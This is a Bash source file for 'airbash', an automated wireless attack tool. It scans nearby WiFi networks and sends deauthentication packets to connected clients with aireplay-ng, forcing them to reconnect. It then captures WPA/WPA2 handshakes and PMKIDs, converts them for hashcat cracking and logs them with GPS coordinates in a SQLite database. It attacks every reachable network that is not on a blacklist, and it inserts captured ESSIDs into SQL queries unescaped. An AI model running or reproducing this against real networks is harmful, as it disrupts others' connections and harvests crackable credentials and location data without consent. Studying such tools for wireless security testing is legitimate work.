# This is the airbash main script (https://github.com/tehw0lf/airbash)
# Written by tehw0lf
# This script is an automated WPA/WPA2 PMKID and handshake collector which uses
# software from https://aircrack-ng.org and https://github.com/ZerBea/hcxtools.
# First, the script will scan for WiFi clients that are connected to access points.
# Then, aireplay is run in deauthentication mode once for each client, which should
# terminate its connection to the access point, thus forcing a reconnect.
# In order to capture the handshake, airodump is being run after sending the
# deauthentication packet. For verification and conversion, hcxpcapngtool and
# hcxpcaptool from hcxtools by ZeroBeat are used for now, until hcxpcapngtool
# is out of experimental state.

check_for_pmkid_or_handshake() {
  # $1 = access point MAC address
  # checks a .cap file for either PMKID or 4-way handshake using
  # extract information to temporary folder and only move if successful
  # sets capture flag to "1" on success and to "0" on failure
  labcounter=$((labcounter + 1))
  pmkid_or_handshake_captured="0"
  tempdirectory="$base_directory/lab$labcounter"
  mkdir "$tempdirectory"
  $("$HCXPCAPTOOL_BINARY" --prefix-out="$tempdirectory/$1" "$1"*.cap &>/dev/null)
  $("$HCXPCAPNGTOOL_BINARY" -o "$tempdirectory/$1.22000" "$1"*.cap &>/dev/null)
  if [ $(ls "$tempdirectory" | grep -e "hccapx" -e "16800" -e "22000" | wc -l) -gt 0 ]; then
    pmkid_or_handshake_captured="1"
    $(sed -i -e s/\:/\*/g "$tempdirectory/$1.16800" &>/dev/null)
    cp "$tempdirectory"/* "$output_directory"/
  fi
  rm -rf "$tempdirectory"
}

check_all_and_update_database() {
  # check all captures and update the database with the new information
  cd "$base_directory"
  for mac_address in $(ls *.cap 2>/dev/null | cut -d '-' -f 1); do
    if [ "$mac_address" == "" ]; then
      continue
    fi
    if [ $(ls "$output_directory/$mac_address"* 2>/dev/null | wc -l) -gt 0 ]; then
      save_to_database "$output_directory/$mac_address"
      continue
    fi
    check_for_pmkid_or_handshake "$mac_address"
    if [ "$pmkid_or_handshake_captured" == "1" ]; then
      save_to_database "$output_directory/$mac_address"
      pmkid_or_handshake_counter=$((pmkid_or_handshake_counter + 1))
    fi
  done
}

kill_aireplay_processes() {
  # kill all instances of aireplay-ng to prevent locking
  for pid in $(pgrep $(basename "$AIREPLAY_BINARY")); do
    { kill $pid && wait $pid; } &>/dev/null
  done
}

kill_airodump_processes() {
  # kill all instances of airodump-ng to prevent locking
  for pid in $(pgrep $(basename "$AIRODUMP_BINARY")); do
    { kill $pid && wait $pid; } &>/dev/null
  done
}

save_to_database() {
  # inserts information into the database
  # existing bssids will not be replaced as the column is UNIQUE
  # empty bssids will not be saved
  location_output=$(sed '2q;d' "$location_directory/"*.txt 2>/dev/null)

  bssid=$(uniq "$1".networklist | awk -F ':' '{print toupper($1)}' | sed -e 's/[0-9A-F]\{2\}/&:/g' -e 's/:$//')
  essid=$(cat "$1".essidlist)
  pmkid=$(cat "$1".16800 2>/dev/null)
  latitude=$(echo "$location_output" | awk -F ',' '{print $2}')
  longitude=$(echo "$location_output" | awk -F ',' '{print $3}')
  if [ "$bssid" != "" ]; then
    "$SQLITE3_BINARY" "$base_directory/$database_filename" "INSERT INTO captures (latitude, longitude, bssid, essid, pmkid) VALUES('$latitude', '$longitude', '$bssid', '$essid', '$pmkid');" 2>/dev/null
  fi

}

# enviro stuff
INTERFACE="wlan0"
AIRCRACK_BINARY=$(which aircrack-ng)
AIRODUMP_BINARY=$(which airodump-ng)
AIREPLAY_BINARY=$(which aireplay-ng)
SQLITE3_BINARY=$(which sqlite3)
HCXPCAPTOOL_BINARY=$(which hcxpcaptool)
HCXPCAPNGTOOL_BINARY=$(which hcxpcapngtool)

if [ -z "$AIRCRACK_BINARY" ]; then
  echo "Make sure aircrack-ng is on your PATH or in $base_directory!"
  exit
fi
if [ -z "$AIRODUMP_BINARY" ]; then
  echo "Make sure airodump-ng is on your PATH or in $base_directory!"
  exit
fi
if [ -z "$AIREPLAY_BINARY" ]; then
  echo "Make sure aireplay-ng is on your PATH or in $base_directory!"
  exit
fi
if [ -z "$SQLITE3_BINARY" ]; then
  echo "Make sure sqlite3 is on your PATH or in $base_directory!"
  exit
fi
if [ -z "$HCXPCAPTOOL_BINARY" ]; then
  echo -e "Make sure hcxtools' wlanhc2hcx is on your path or in $base_directory!\n  Source available at https://github.com/ZerBea/hcxtools/blob/master/wlanhc2hcx.c"
  echo "conversion unavailable"
fi
if [ -z "$HCXPCAPNGTOOL_BINARY" ]; then
  echo -e "Make sure hcxtools' wlanhc2hcx is on your path or in $base_directory!\n  Source available at https://github.com/ZerBea/hcxtools/blob/master/wlanhc2hcx.c"
  echo "22000 conversion unavailable"
fi

# configure path variables
base_directory=$(realpath .)
database_filename=".database.sqlite3"
blacklist=".blacklist"
output_directory="$base_directory/.output"
location_directory="$base_directory/.location"
wordlist_directory="$base_directory/.wordlists"
initial_scan_prefix="initlist"
initial_scan_file="$initial_scan_prefix-01.csv"

# create nonexisting paths and files
mkdir "$output_directory" &>/dev/null
touch "$base_directory/$blacklist"
kill_airodump_processes

# clean up previous files (and .tar backups if present)
rm -f "$base_directory/"initlist &>/dev/null
rm -f "$base_directory/"*.csv &>/dev/null
rm -f "$base_directory/"*.cap &>/dev/null
rm -f "$base_directory/lab"* &>/dev/null

# initial 20 second scan to determine targets
{ "$AIRODUMP_BINARY" -w "$base_directory/$initial_scan_prefix" -o csv "$INTERFACE" &>/dev/null; } &
sleep 20
kill_airodump_processes
labcounter=0
pmkid_or_handshake_counter=0
access_point_counter=1
$(tr -d ' ' <$base_directory/$initial_scan_file 2>/dev/null | awk '/Station/{y=1;next}y' | awk -F ',' '{print $6}' | grep -v [\(] | sort -u | sed '/^\s*$/d' >"$base_directory/"num_access_points.lst)
num_access_points=$(wc -l <"$base_directory/"num_access_points.lst)
$(rm -f "$base_directory/"num_access_points.lst)
# stage 1: access points (scan and apply filters)
for access_point in $(tr -d ' ' <$base_directory/$initial_scan_file 2>/dev/null | awk '/Station/{y=1;next}y' | awk -F ',' '{print $6}' | grep -v [\(] | sort -u | sed '/^\s*$/d'); do
  channel=$(tr -d ' ' <$base_directory/$initial_scan_file 2>/dev/null | grep $access_point | awk -F ',' 'NR==1{print $4}')
  echo "_$access_point_counter/$num_access_points    "
  { "$AIRODUMP_BINARY" -c $channel --bssid $access_point -w $base_directory/$access_point -o pcap $INTERFACE &>/dev/null; } &
  sleep 2
  if [ $(grep -c $access_point "$base_directory/$blacklist" 2>/dev/null) -gt 0 ]; then
    # blacklisted access point
    echo "-         "
    kill_airodump_processes
    access_point_counter=$((access_point_counter + 1))
    continue
  fi
  if [ $("$SQLITE3_BINARY" "$base_directory/$database_filename" "SELECT * FROM captures WHERE bssid='$access_point'" 2>/dev/null | grep -c $access_point) -gt 0 ]; then
    # handshake for access point present in database
    echo "x         "
    kill_airodump_processes
    access_point_counter=$((access_point_counter + 1))
    continue
  fi
  if [ $(ls "$base_directory/$access_point"*.cap 2>/dev/null | grep -c cap) -eq 0 ]; then
    # access point is not reachable anymore
    echo "?         "
    kill_airodump_processes
    access_point_counter=$((access_point_counter + 1))
    continue
  fi
  client_counter=1
  $(tr -d ' ' <$base_directory/$initial_scan_file 2>/dev/null | awk '/Station/{y=1;next}y' | grep -v [\(] | sed '/^\s*$/d' | awk -F ',' '{print $1}' >"$base_directory/"num_clients.lst)
  num_clients=$(wc -l <"$base_directory/"num_clients.lst)
  rm -f "$base_directory/"num_clients.lst
  # stage 2: deauthenticate clients and try to capture handshake
  for client in $(tr -d ' ' <$base_directory/$initial_scan_file 2>/dev/null | awk '/Station/{y=1;next}y' | grep -v [\(] | sed '/^\s*$/d' | awk -F ',' '{print $1}'); do
    client_bssid=$(tr -d ' ' <$base_directory/$initial_scan_file 2>/dev/null | awk '/Station/{y=1;next}y' | grep -v [\(] | sed '/^\s*$/d' | grep $client | grep $access_point | awk -F ',' '{print $6}')
    if [ "$client_bssid" == "$access_point" ]; then
      echo "__$client_counter/$num_clients    "
      # send a single deauthentication packet
      { "$AIREPLAY_BINARY" -0 1 -a $access_point -c $client -F $INTERFACE &>/dev/null; } &
      sleep 5
      check_for_pmkid_or_handshake "$access_point"
      if [ "$pmkid_or_handshake_captured" == "1" ]; then
        pmkid_or_handshake_counter=$((pmkid_or_handshake_counter + 1))
        kill_aireplay_processes
        break
      fi
      kill_aireplay_processes
      client_counter=$((client_counter + 1))
    else
      client_counter=$((client_counter + 1))
    fi
  done
  sleep 5
  kill_airodump_processes
  access_point_counter=$((access_point_counter + 1))
done
rm -f "$base_directory/"initlist*

# finalize by inserting data for captured handshakes into database
# and converting the .cap file for use with hashcat
check_all_and_update_database
rm -f "$base_directory/"*.cap &>/dev/null
echo "_______"
echo "$pmkid_or_handshake_counter!"
